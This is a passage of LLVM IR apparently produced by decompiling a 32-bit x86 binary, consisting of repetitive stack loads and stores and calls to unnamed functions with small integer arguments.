  %v2_80487ba = load i32, i32* %v1_80487ba, align 4
  store i32 %v2_80487ba, i32* @ebx, align 4
  %v1_80487bb = add i32 %v0_80487ba, 10388
  store i32 %v1_80487bb, i32* %ecx.global-to-local, align 4
  store i32 %v1_80487bb, i32* %v1_80487ba, align 4
  %v2_80487c3 = call i32 @function_8051bf0(i8* %v1_8048752)
  store i32 %v2_80487c3, i32* %eax.global-to-local, align 4
  %v0_80487c8 = load i32, i32* @esp, align 4
  %v1_80487c8 = inttoptr i32 %v0_80487c8 to i32*
  %v2_80487c8 = load i32, i32* %v1_80487c8, align 4
  store i32 %v2_80487c8, i32* %edx.global-to-local, align 4
  %v3_80487c8 = add i32 %v0_80487c8, 4
  %v1_80487c9 = inttoptr i32 %v3_80487c8 to i32*
  %v2_80487c9 = load i32, i32* %v1_80487c9, align 4
  store i32 %v2_80487c9, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint ([24 x i8]* @global_var_8054a8f.8 to i32), i32* %v1_80487c9, align 4
  %v1_80487cf = add i32 %v0_80487c8, 10388
  store i32 %v1_80487cf, i32* %edx.global-to-local, align 4
  %v2_80487d6 = add i32 %v1_80487cf, %v2_80487c3
  store i32 %v2_80487d6, i32* %eax.global-to-local, align 4
  store i32 %v2_80487d6, i32* %v1_80487c8, align 4
  %v3_80487da = call i32 @function_8051c10(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80487da, i32* %eax.global-to-local, align 4
  %v0_80487df = load i32, i32* @esp, align 4
  %v1_80487df = inttoptr i32 %v0_80487df to i32*
  %v2_80487df = load i32, i32* %v1_80487df, align 4
  store i32 %v2_80487df, i32* @ebx, align 4
  %v1_80487e0 = add i32 %v0_80487df, 10388
  store i32 %v1_80487e0, i32* %ecx.global-to-local, align 4
  store i32 %v1_80487e0, i32* %v1_80487df, align 4
  %v2_80487e8 = call i32 @function_8051bf0(i8* %v1_8048752)
  store i32 %v2_80487e8, i32* %eax.global-to-local, align 4
  %v0_80487ed = load i32, i32* @esp, align 4
  %v1_80487ed = inttoptr i32 %v0_80487ed to i32*
  %v3_80487ed = add i32 %v0_80487ed, 4
  %v0_80487ee = load i32, i32* @edi, align 4
  %v1_80487ee = add i32 %v0_80487ee, 20
  store i32 %v1_80487ee, i32* %edx.global-to-local, align 4
  %v1_80487f1 = inttoptr i32 %v3_80487ed to i32*
  %v2_80487f1 = load i32, i32* %v1_80487f1, align 4
  store i32 %v2_80487f1, i32* %ecx.global-to-local, align 4
  store i32 %v1_80487ee, i32* %v1_80487f1, align 4
  %v1_80487f3 = add i32 %v0_80487ed, 10388
  store i32 %v1_80487f3, i32* %edx.global-to-local, align 4
  %v2_80487fa = add i32 %v1_80487f3, %v2_80487e8
  store i32 %v2_80487fa, i32* %eax.global-to-local, align 4
  store i32 %v2_80487fa, i32* %v1_80487ed, align 4
  %v3_80487fe = call i32 @function_8051c10(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80487fe, i32* %eax.global-to-local, align 4
  %v0_8048803 = load i32, i32* @esp, align 4
  %v1_8048803 = inttoptr i32 %v0_8048803 to i32*
  %v2_8048803 = load i32, i32* %v1_8048803, align 4
  store i32 %v2_8048803, i32* @ebx, align 4
  %v1_8048804 = add i32 %v0_8048803, 10388
  store i32 %v1_8048804, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048804, i32* %v1_8048803, align 4
  %v2_804880c = call i32 @function_8051bf0(i8* %v1_8048752)
  store i32 %v2_804880c, i32* %eax.global-to-local, align 4
  %v0_8048811 = load i32, i32* @esp, align 4
  %v1_8048811 = inttoptr i32 %v0_8048811 to i32*
  %v2_8048811 = load i32, i32* %v1_8048811, align 4
  store i32 %v2_8048811, i32* %edx.global-to-local, align 4
  %v3_8048811 = add i32 %v0_8048811, 4
  %v1_8048812 = inttoptr i32 %v3_8048811 to i32*
  %v2_8048812 = load i32, i32* %v1_8048812, align 4
  store i32 %v2_8048812, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_8054aa7.9 to i32), i32* %v1_8048812, align 4
  %v1_8048818 = add i32 %v0_8048811, 10388
  store i32 %v1_8048818, i32* %edx.global-to-local, align 4
  %v2_804881f = add i32 %v1_8048818, %v2_804880c
  store i32 %v2_804881f, i32* %eax.global-to-local, align 4
  store i32 %v2_804881f, i32* %v1_8048811, align 4
  %v3_8048823 = call i32 @function_8051c10(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048823, i32* %eax.global-to-local, align 4
  %v0_8048828 = load i32, i32* @esp, align 4
  %v1_8048828 = inttoptr i32 %v0_8048828 to i32*
  %v2_8048828 = load i32, i32* %v1_8048828, align 4
  store i32 %v2_8048828, i32* @ebx, align 4
  %v1_8048829 = add i32 %v0_8048828, 10388
  store i32 %v1_8048829, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048829, i32* %v1_8048828, align 4
  %v2_8048831 = call i32 @function_8051bf0(i8* %v1_8048752)
  store i32 %v2_8048831, i32* %eax.global-to-local, align 4
  %v0_8048836 = load i32, i32* @esp, align 4
  %v1_8048836 = inttoptr i32 %v0_8048836 to i32*
  %v3_8048836 = add i32 %v0_8048836, 4
  %v0_8048837 = load i32, i32* @edi, align 4
  %v1_8048837 = add i32 %v0_8048837, 789
  store i32 %v1_8048837, i32* %edx.global-to-local, align 4
  %v1_804883d = inttoptr i32 %v3_8048836 to i32*
  %v2_804883d = load i32, i32* %v1_804883d, align 4
  store i32 %v2_804883d, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048837, i32* %v1_804883d, align 4
  %v1_804883f = add i32 %v0_8048836, 10388
  store i32 %v1_804883f, i32* %edx.global-to-local, align 4
  %v2_8048846 = add i32 %v1_804883f, %v2_8048831
  store i32 %v2_8048846, i32* %eax.global-to-local, align 4
  store i32 %v2_8048846, i32* %v1_8048836, align 4
  %v3_804884a = call i32 @function_8051c10(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804884a, i32* %eax.global-to-local, align 4
  %v0_804884f = load i32, i32* @esp, align 4
  %v1_804884f = inttoptr i32 %v0_804884f to i32*
  %v2_804884f = load i32, i32* %v1_804884f, align 4
  store i32 %v2_804884f, i32* %eax.global-to-local, align 4
  %v1_8048850 = add i32 %v0_804884f, 10388
  store i32 %v1_8048850, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048850, i32* %v1_804884f, align 4
  %v2_8048858 = call i32 @function_8051bf0(i8* %v1_8048752)
  store i32 %v2_8048858, i32* %eax.global-to-local, align 4
  %v0_804885d = load i32, i32* @esp, align 4
  %v1_804885d = inttoptr i32 %v0_804885d to i32*
  %v2_804885d = load i32, i32* %v1_804885d, align 4
  store i32 %v2_804885d, i32* %ecx.global-to-local, align 4
  %v3_804885d = add i32 %v0_804885d, 4
  %v1_804885e = inttoptr i32 %v3_804885d to i32*
  %v2_804885e = load i32, i32* %v1_804885e, align 4
  store i32 %v2_804885e, i32* @ebx, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_8054ac6.10 to i32), i32* %v1_804885e, align 4
  %v1_8048864 = add i32 %v0_804885d, 10388
  store i32 %v1_8048864, i32* %edx.global-to-local, align 4
  %v2_804886b = add i32 %v1_8048864, %v2_8048858
  store i32 %v2_804886b, i32* %eax.global-to-local, align 4
  store i32 %v2_804886b, i32* %v1_804885d, align 4
  %v3_804886f = call i32 @function_8051c10(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804886f, i32* %eax.global-to-local, align 4
  %v0_8048874 = load i32, i32* @esp, align 4
  %v1_8048874 = inttoptr i32 %v0_8048874 to i32*
  store i32 32, i32* %v1_8048874, align 4
  %v2_804887b = call i32 @function_80512a0(i8 %v1_804887b)
  store i32 %v2_804887b, i32* %eax.global-to-local, align 4
  %v0_8048880 = load i32, i32* @esp, align 4
  %v1_8048880 = inttoptr i32 %v0_8048880 to i32*
  %v2_8048880 = load i32, i32* %v1_8048880, align 4
  store i32 %v2_8048880, i32* %eax.global-to-local, align 4
  %v3_8048880 = add i32 %v0_8048880, 4
  %v1_8048881 = inttoptr i32 %v3_8048880 to i32*
  %v2_8048881 = load i32, i32* %v1_8048881, align 4
  store i32 %v2_8048881, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_8048881, align 4
  store i32 32, i32* %v1_8048880, align 4
  %v3_8048886 = call i32 @function_80511f0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8048886, i32* %eax.global-to-local, align 4
  store i32 %v3_8048886, i32* @ebx, align 4
  %v0_804888d = load i32, i32* @esp, align 4
  %v1_804888d = inttoptr i32 %v0_804888d to i32*
  %v2_804888d = load i32, i32* %v1_804888d, align 4
  store i32 %v2_804888d, i32* %eax.global-to-local, align 4
  %v1_804888e = add i32 %v0_804888d, 10388
  store i32 %v1_804888e, i32* %ecx.global-to-local, align 4
  store i32 %v1_804888e, i32* %v1_804888d, align 4
  %v2_8048896 = call i32 @function_8051bf0(i8* %v1_8048752)
  store i32 %v2_8048896, i32* %eax.global-to-local, align 4
  %v0_804889b = load i32, i32* @esp, align 4
  %v1_804889b = inttoptr i32 %v0_804889b to i32*
  %v2_804889b = load i32, i32* %v1_804889b, align 4
  store i32 %v2_804889b, i32* %edx.global-to-local, align 4
  %v3_804889b = add i32 %v0_804889b, 4
  %v1_804889c = inttoptr i32 %v3_804889b to i32*
  %v2_804889c = load i32, i32* %v1_804889c, align 4
  store i32 %v2_804889c, i32* %ecx.global-to-local, align 4
  %v0_804889d = load i32, i32* @ebx, align 4
  store i32 %v0_804889d, i32* %v1_804889c, align 4
  %v1_804889e = add i32 %v0_804889b, 10388
  store i32 %v1_804889e, i32* %edx.global-to-local, align 4
  %v2_80488a5 = add i32 %v1_804889e, %v2_8048896
  store i32 %v2_80488a5, i32* %eax.global-to-local, align 4
  store i32 %v2_80488a5, i32* %v1_804889b, align 4
  %v3_80488a9 = call i32 @function_8051c10(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80488a9, i32* %eax.global-to-local, align 4
  %v0_80488ae = load i32, i32* @esp, align 4
  %v1_80488ae = inttoptr i32 %v0_80488ae to i32*
  store i32 32, i32* %v1_80488ae, align 4
  %v2_80488b5 = call i32 @function_8051220(i8 %v1_804887b)
  store i32 %v2_80488b5, i32* %eax.global-to-local, align 4
  %v0_80488ba = load i32, i32* @esp, align 4
  %v1_80488ba = inttoptr i32 %v0_80488ba to i32*
  %v2_80488ba = load i32, i32* %v1_80488ba, align 4
  store i32 %v2_80488ba, i32* %eax.global-to-local, align 4
  %v1_80488bb = add i32 %v0_80488ba, 10388
  store i32 %v1_80488bb, i32* %ecx.global-to-local, align 4
  store i32 %v1_80488bb, i32* %v1_80488ba, align 4
  %v2_80488c3 = call i32 @function_8051bf0(i8* %v1_8048752)
  store i32 %v2_80488c3, i32* %eax.global-to-local, align 4
  %v0_80488c8 = load i32, i32* @esp, align 4
  %v1_80488c8 = inttoptr i32 %v0_80488c8 to i32*
  %v2_80488c8 = load i32, i32* %v1_80488c8, align 4
  store i32 %v2_80488c8, i32* %ecx.global-to-local, align 4
  %v3_80488c8 = add i32 %v0_80488c8, 4
  %v1_80488c9 = inttoptr i32 %v3_80488c8 to i32*
  %v2_80488c9 = load i32, i32* %v1_80488c9, align 4
  store i32 %v2_80488c9, i32* @ebx, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_8054ac6.10 to i32), i32* %v1_80488c9, align 4
  %v1_80488cf = add i32 %v0_80488c8, 10388
  store i32 %v1_80488cf, i32* %edx.global-to-local, align 4
  %v2_80488d6 = add i32 %v1_80488cf, %v2_80488c3
  store i32 %v2_80488d6, i32* %eax.global-to-local, align 4
  store i32 %v2_80488d6, i32* %v1_80488c8, align 4
  %v3_80488da = call i32 @function_8051c10(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80488da, i32* %eax.global-to-local, align 4
  %v0_80488df = load i32, i32* @esp, align 4
  %v1_80488df = inttoptr i32 %v0_80488df to i32*
  store i32 33, i32* %v1_80488df, align 4
  %v2_80488e6 = call i32 @function_80512a0(i8 %v1_804887b)
  store i32 %v2_80488e6, i32* %eax.global-to-local, align 4
  %v0_80488eb = load i32, i32* @esp, align 4
  %v1_80488eb = inttoptr i32 %v0_80488eb to i32*
  %v2_80488eb = load i32, i32* %v1_80488eb, align 4
  store i32 %v2_80488eb, i32* %eax.global-to-local, align 4
  %v3_80488eb = add i32 %v0_80488eb, 4
  %v1_80488ec = inttoptr i32 %v3_80488eb to i32*
  %v2_80488ec = load i32, i32* %v1_80488ec, align 4
  store i32 %v2_80488ec, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_80488ec, align 4
  store i32 33, i32* %v1_80488eb, align 4
  %v3_80488f1 = call i32 @function_80511f0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_80488f1, i32* %eax.global-to-local, align 4
  store i32 %v3_80488f1, i32* @ebx, align 4
  %v0_80488f8 = load i32, i32* @esp, align 4
  %v1_80488f8 = inttoptr i32 %v0_80488f8 to i32*
  %v2_80488f8 = load i32, i32* %v1_80488f8, align 4
  store i32 %v2_80488f8, i32* %eax.global-to-local, align 4
  %v1_80488f9 = add i32 %v0_80488f8, 10388
  store i32 %v1_80488f9, i32* %ecx.global-to-local, align 4
  store i32 %v1_80488f9, i32* %v1_80488f8, align 4
  %v2_8048901 = call i32 @function_8051bf0(i8* %v1_8048752)
  store i32 %v2_8048901, i32* %eax.global-to-local, align 4
  %v0_8048906 = load i32, i32* @esp, align 4
  %v1_8048906 = inttoptr i32 %v0_8048906 to i32*
  %v2_8048906 = load i32, i32* %v1_8048906, align 4
  store i32 %v2_8048906, i32* %edx.global-to-local, align 4
  %v3_8048906 = add i32 %v0_8048906, 4
  %v1_8048907 = inttoptr i32 %v3_8048906 to i32*
  %v2_8048907 = load i32, i32* %v1_8048907, align 4
  store i32 %v2_8048907, i32* %ecx.global-to-local, align 4
  %v0_8048908 = load i32, i32* @ebx, align 4
  store i32 %v0_8048908, i32* %v1_8048907, align 4
  %v1_8048909 = add i32 %v0_8048906, 10388
  store i32 %v1_8048909, i32* %edx.global-to-local, align 4
  %v2_8048910 = add i32 %v1_8048909, %v2_8048901
  store i32 %v2_8048910, i32* %eax.global-to-local, align 4
  store i32 %v2_8048910, i32* %v1_8048906, align 4
  %v3_8048914 = call i32 @function_8051c10(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048914, i32* %eax.global-to-local, align 4
  %v0_8048919 = load i32, i32* @esp, align 4
  %v1_8048919 = inttoptr i32 %v0_8048919 to i32*
  store i32 33, i32* %v1_8048919, align 4
  %v2_8048920 = call i32 @function_8051220(i8 %v1_804887b)
  store i32 %v2_8048920, i32* %eax.global-to-local, align 4
  %v0_8048925 = load i32, i32* @esp, align 4
  %v1_8048925 = inttoptr i32 %v0_8048925 to i32*
  %v2_8048925 = load i32, i32* %v1_8048925, align 4
  store i32 %v2_8048925, i32* %eax.global-to-local, align 4
  %v1_8048926 = add i32 %v0_8048925, 10388
  store i32 %v1_8048926, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048926, i32* %v1_8048925, align 4
  %v2_804892e = call i32 @function_8051bf0(i8* %v1_8048752)
  store i32 %v2_804892e, i32* %eax.global-to-local, align 4
  %v0_8048933 = load i32, i32* @esp, align 4
  %v1_8048933 = inttoptr i32 %v0_8048933 to i32*
  %v2_8048933 = load i32, i32* %v1_8048933, align 4
  store i32 %v2_8048933, i32* %ecx.global-to-local, align 4
  %v3_8048933 = add i32 %v0_8048933, 4
  %v1_8048934 = inttoptr i32 %v3_8048933 to i32*
  %v2_8048934 = load i32, i32* %v1_8048934, align 4
  store i32 %v2_8048934, i32* @ebx, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_8054ac6.10 to i32), i32* %v1_8048934, align 4
  %v1_804893a = add i32 %v0_8048933, 10388
  store i32 %v1_804893a, i32* %edx.global-to-local, align 4
  %v2_8048941 = add i32 %v1_804893a, %v2_804892e
  store i32 %v2_8048941, i32* %eax.global-to-local, align 4
  store i32 %v2_8048941, i32* %v1_8048933, align 4
  %v3_8048945 = call i32 @function_8051c10(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048945, i32* %eax.global-to-local, align 4
  %v0_804894a = load i32, i32* @esp, align 4
  %v1_804894a = inttoptr i32 %v0_804894a to i32*
  store i32 34, i32* %v1_804894a, align 4
  %v2_8048951 = call i32 @function_80512a0(i8 %v1_804887b)
  store i32 %v2_8048951, i32* %eax.global-to-local, align 4
  %v0_8048956 = load i32, i32* @esp, align 4
  %v1_8048956 = inttoptr i32 %v0_8048956 to i32*
  %v2_8048956 = load i32, i32* %v1_8048956, align 4
  store i32 %v2_8048956, i32* %eax.global-to-local, align 4
  %v3_8048956 = add i32 %v0_8048956, 4
  %v1_8048957 = inttoptr i32 %v3_8048956 to i32*
  %v2_8048957 = load i32, i32* %v1_8048957, align 4
  store i32 %v2_8048957, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_8048957, align 4
  store i32 34, i32* %v1_8048956, align 4
  %v3_804895c = call i32 @function_80511f0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_804895c, i32* %eax.global-to-local, align 4
  store i32 %v3_804895c, i32* @ebx, align 4
  %v0_8048963 = load i32, i32* @esp, align 4
  %v1_8048963 = inttoptr i32 %v0_8048963 to i32*
  %v2_8048963 = load i32, i32* %v1_8048963, align 4
  store i32 %v2_8048963, i32* %eax.global-to-local, align 4
  %v1_8048964 = add i32 %v0_8048963, 10388
  store i32 %v1_8048964, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048964, i32* %v1_8048963, align 4
  %v2_804896c = call i32 @function_8051bf0(i8* %v1_8048752)
  store i32 %v2_804896c, i32* %eax.global-to-local, align 4
  %v0_8048971 = load i32, i32* @esp, align 4
  %v1_8048971 = inttoptr i32 %v0_8048971 to i32*
  %v2_8048971 = load i32, i32* %v1_8048971, align 4
  store i32 %v2_8048971, i32* %edx.global-to-local, align 4
  %v3_8048971 = add i32 %v0_8048971, 4
  %v1_8048972 = inttoptr i32 %v3_8048971 to i32*
  %v2_8048972 = load i32, i32* %v1_8048972, align 4
  store i32 %v2_8048972, i32* %ecx.global-to-local, align 4
  %v0_8048973 = load i32, i32* @ebx, align 4
  store i32 %v0_8048973, i32* %v1_8048972, align 4
  %v1_8048974 = add i32 %v0_8048971, 10388
  store i32 %v1_8048974, i32* %edx.global-to-local, align 4
  %v2_804897b = add i32 %v1_8048974, %v2_804896c
  store i32 %v2_804897b, i32* %eax.global-to-local, align 4
  store i32 %v2_804897b, i32* %v1_8048971, align 4
  %v3_804897f = call i32 @function_8051c10(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804897f, i32* %eax.global-to-local, align 4
  %v0_8048984 = load i32, i32* @esp, align 4
  %v1_8048984 = inttoptr i32 %v0_8048984 to i32*
  store i32 34, i32* %v1_8048984, align 4
  %v2_804898b = call i32 @function_8051220(i8 %v1_804887b)
  store i32 %v2_804898b, i32* %eax.global-to-local, align 4
  %v0_8048990 = load i32, i32* @esp, align 4
  %v1_8048990 = inttoptr i32 %v0_8048990 to i32*
  %v1_8048991 = add i32 %v0_8048990, 10388
  store i32 %v1_8048991, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048991, i32* %v1_8048990, align 4
  %v2_8048999 = call i32 @function_8051bf0(i8* %v1_8048752)
  store i32 %v2_8048999, i32* %eax.global-to-local, align 4
  %v0_804899e = load i32, i32* @esp, align 4
  %v1_804899e = inttoptr i32 %v0_804899e to i32*
  %v2_804899e = load i32, i32* %v1_804899e, align 4
  store i32 %v2_804899e, i32* @ebx, align 4
  %v3_804899e = add i32 %v0_804899e, 4
  %v1_804899f = inttoptr i32 %v3_804899e to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8054ac6.10 to i32), i32* %v1_804899f, align 4
  %v1_80489a5 = add i32 %v0_804899e, 10388
  store i32 %v1_80489a5, i32* %edx.global-to-local, align 4
  %v2_80489ac = add i32 %v1_80489a5, %v2_8048999
  store i32 %v2_80489ac, i32* %eax.global-to-local, align 4
  store i32 %v2_80489ac, i32* %v1_804899e, align 4
  %v3_80489b0 = call i32 @function_8051c10(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80489b0, i32* %eax.global-to-local, align 4
  %v0_80489b5 = load i32, i32* @esp, align 4
  %v1_80489b5 = add i32 %v0_80489b5, 16
  %v1_80489b8 = add i32 %v0_80489b5, 68
  %v2_80489b8 = inttoptr i32 %v1_80489b8 to i32*
  %v3_80489b8 = load i32, i32* %v2_80489b8, align 4
  store i32 %v3_80489b8, i32* %ecx.global-to-local, align 4
  %v1_80489bc = icmp eq i32 %v3_80489b8, 0
  store i1 %v1_80489bc, i1* %zf.global-to-local, align 1
  br i1 %v1_80489bc, label %dec_label_pc_8048ad8, label %dec_label_pc_80489c4

dec_label_pc_80489c4:                             ; preds = %dec_label_pc_8048700
  %v9_80489c4 = icmp eq i32 %v0_80489b5, -4
  store i1 %v9_80489c4, i1* %zf.global-to-local, align 1
  %v2_80489c7 = inttoptr i32 %v0_80489b5 to i32*
  store i32 35, i32* %v2_80489c7, align 4
  %v2_80489c9 = call i32 @function_80512a0(i8 %v1_804887b)
  store i32 %v2_80489c9, i32* %eax.global-to-local, align 4
  %v0_80489ce = load i32, i32* @esp, align 4
  %v1_80489ce = inttoptr i32 %v0_80489ce to i32*
  %v2_80489ce = load i32, i32* %v1_80489ce, align 4
  store i32 %v2_80489ce, i32* %eax.global-to-local, align 4
  %v3_80489ce = add i32 %v0_80489ce, 4
  %v1_80489cf = inttoptr i32 %v3_80489ce to i32*
  %v2_80489cf = load i32, i32* %v1_80489cf, align 4
  store i32 %v2_80489cf, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_80489cf, align 4
  store i32 35, i32* %v1_80489ce, align 4
  %v3_80489d4 = call i32 @function_80511f0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_80489d4, i32* %eax.global-to-local, align 4
  store i32 %v3_80489d4, i32* @ebx, align 4
  %v0_80489db = load i32, i32* @esp, align 4
  %v1_80489db = inttoptr i32 %v0_80489db to i32*
  %v2_80489db = load i32, i32* %v1_80489db, align 4
  store i32 %v2_80489db, i32* %eax.global-to-local, align 4
  %v1_80489dc = add i32 %v0_80489db, 10388
  store i32 %v1_80489dc, i32* %ecx.global-to-local, align 4
  store i32 %v1_80489dc, i32* %v1_80489db, align 4
  %v2_80489e4 = call i32 @function_8051bf0(i8* %v1_8048752)
  store i32 %v2_80489e4, i32* %eax.global-to-local, align 4
  %v0_80489e9 = load i32, i32* @esp, align 4
  %v1_80489e9 = inttoptr i32 %v0_80489e9 to i32*
  %v2_80489e9 = load i32, i32* %v1_80489e9, align 4
  store i32 %v2_80489e9, i32* %edx.global-to-local, align 4
  %v3_80489e9 = add i32 %v0_80489e9, 4
  %v1_80489ea = inttoptr i32 %v3_80489e9 to i32*
  %v2_80489ea = load i32, i32* %v1_80489ea, align 4
  store i32 %v2_80489ea, i32* %ecx.global-to-local, align 4
  %v0_80489eb = load i32, i32* @ebx, align 4
  store i32 %v0_80489eb, i32* %v1_80489ea, align 4
  %v1_80489ec = add i32 %v0_80489e9, 10388
  store i32 %v1_80489ec, i32* %edx.global-to-local, align 4
  %v2_80489f3 = add i32 %v1_80489ec, %v2_80489e4
  store i32 %v2_80489f3, i32* %eax.global-to-local, align 4
  store i32 %v2_80489f3, i32* %v1_80489e9, align 4
  %v3_80489f7 = call i32 @function_8051c10(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80489f7, i32* %eax.global-to-local, align 4
  %v0_80489fc = load i32, i32* @esp, align 4
  %v1_80489fc = inttoptr i32 %v0_80489fc to i32*
  store i32 35, i32* %v1_80489fc, align 4
  %v2_8048a03 = call i32 @function_8051220(i8 %v1_804887b)
  store i32 %v2_8048a03, i32* %eax.global-to-local, align 4
  %v0_8048a08 = load i32, i32* @esp, align 4
  %v1_8048a08 = inttoptr i32 %v0_8048a08 to i32*
  %v2_8048a08 = load i32, i32* %v1_8048a08, align 4
  store i32 %v2_8048a08, i32* %eax.global-to-local, align 4
  %v1_8048a09 = add i32 %v0_8048a08, 10388
  store i32 %v1_8048a09, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048a09, i32* %v1_8048a08, align 4
  %v2_8048a11 = call i32 @function_8051bf0(i8* %v1_8048752)
  store i32 %v2_8048a11, i32* %eax.global-to-local, align 4
  %v0_8048a16 = load i32, i32* @esp, align 4
  %v1_8048a16 = inttoptr i32 %v0_8048a16 to i32*
  %v2_8048a16 = load i32, i32* %v1_8048a16, align 4
  store i32 %v2_8048a16, i32* %ecx.global-to-local, align 4
  %v3_8048a16 = add i32 %v0_8048a16, 4
  %v1_8048a17 = inttoptr i32 %v3_8048a16 to i32*
  %v2_8048a17 = load i32, i32* %v1_8048a17, align 4
  store i32 %v2_8048a17, i32* @ebx, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_8054ac6.10 to i32), i32* %v1_8048a17, align 4
  %v1_8048a1d = add i32 %v0_8048a16, 10388
  store i32 %v1_8048a1d, i32* %edx.global-to-local, align 4
  %v2_8048a24 = add i32 %v1_8048a1d, %v2_8048a11
  store i32 %v2_8048a24, i32* %eax.global-to-local, align 4
  store i32 %v2_8048a24, i32* %v1_8048a16, align 4
  %v3_8048a28 = call i32 @function_8051c10(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048a28, i32* %eax.global-to-local, align 4
  %v0_8048a2d = load i32, i32* @esp, align 4
  %v1_8048a2d = inttoptr i32 %v0_8048a2d to i32*
  %v2_8048a2d = load i32, i32* %v1_8048a2d, align 4
  store i32 %v2_8048a2d, i32* %eax.global-to-local, align 4
  %v3_8048a2d = add i32 %v0_8048a2d, 4
  %v1_8048a2e = inttoptr i32 %v3_8048a2d to i32*
  %v2_8048a2e = load i32, i32* %v1_8048a2e, align 4
  store i32 %v2_8048a2e, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_8048a2e, align 4
  store i32 40, i32* %v1_8048a2d, align 4
  %v3_8048a33 = call i32 @function_80511f0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8048a33, i32* %eax.global-to-local, align 4
  store i32 %v3_8048a33, i32* @ebx, align 4
  %v0_8048a3a = load i32, i32* @esp, align 4
  %v1_8048a3a = inttoptr i32 %v0_8048a3a to i32*
  %v2_8048a3a = load i32, i32* %v1_8048a3a, align 4
  store i32 %v2_8048a3a, i32* %eax.global-to-local, align 4
  %v1_8048a3b = add i32 %v0_8048a3a, 10388
  store i32 %v1_8048a3b, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048a3b, i32* %v1_8048a3a, align 4
  %v2_8048a43 = call i32 @function_8051bf0(i8* %v1_8048752)
  store i32 %v2_8048a43, i32* %eax.global-to-local, align 4
  %v0_8048a48 = load i32, i32* @esp, align 4
  %v1_8048a48 = inttoptr i32 %v0_8048a48 to i32*
  %v2_8048a48 = load i32, i32* %v1_8048a48, align 4
  store i32 %v2_8048a48, i32* %edx.global-to-local, align 4
  %v3_8048a48 = add i32 %v0_8048a48, 4
  %v1_8048a49 = inttoptr i32 %v3_8048a48 to i32*
  %v2_8048a49 = load i32, i32* %v1_8048a49, align 4
  store i32 %v2_8048a49, i32* %ecx.global-to-local, align 4
  %v0_8048a4a = load i32, i32* @ebx, align 4
  store i32 %v0_8048a4a, i32* %v1_8048a49, align 4
  %v1_8048a4b = add i32 %v0_8048a48, 10388
  store i32 %v1_8048a4b, i32* %edx.global-to-local, align 4
  %v2_8048a52 = add i32 %v1_8048a4b, %v2_8048a43
  store i32 %v2_8048a52, i32* %eax.global-to-local, align 4
  store i32 %v2_8048a52, i32* %v1_8048a48, align 4
  %v3_8048a56 = call i32 @function_8051c10(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048a56, i32* %eax.global-to-local, align 4
  %v0_8048a5b = load i32, i32* @esp, align 4
  %v1_8048a5b = inttoptr i32 %v0_8048a5b to i32*
  %v2_8048a5b = load i32, i32* %v1_8048a5b, align 4
  store i32 %v2_8048a5b, i32* @ebx, align 4
  %v1_8048a5c = add i32 %v0_8048a5b, 10388
  store i32 %v1_8048a5c, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048a5c, i32* %v1_8048a5b, align 4
  %v2_8048a64 = call i32 @function_8051bf0(i8* %v1_8048752)
  store i32 %v2_8048a64, i32* %eax.global-to-local, align 4
  %v0_8048a69 = load i32, i32* @esp, align 4
  %v1_8048a69 = inttoptr i32 %v0_8048a69 to i32*
  %v2_8048a69 = load i32, i32* %v1_8048a69, align 4
  store i32 %v2_8048a69, i32* %edx.global-to-local, align 4
  %v3_8048a69 = add i32 %v0_8048a69, 4
  %v1_8048a6a = inttoptr i32 %v3_8048a69 to i32*
  %v2_8048a6a = load i32, i32* %v1_8048a6a, align 4
  store i32 %v2_8048a6a, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8054abf.7 to i32), i32* %v1_8048a6a, align 4
  %v1_8048a70 = add i32 %v0_8048a69, 10388
  store i32 %v1_8048a70, i32* %edx.global-to-local, align 4
  %v2_8048a77 = add i32 %v1_8048a70, %v2_8048a64
  store i32 %v2_8048a77, i32* %eax.global-to-local, align 4
  store i32 %v2_8048a77, i32* %v1_8048a69, align 4
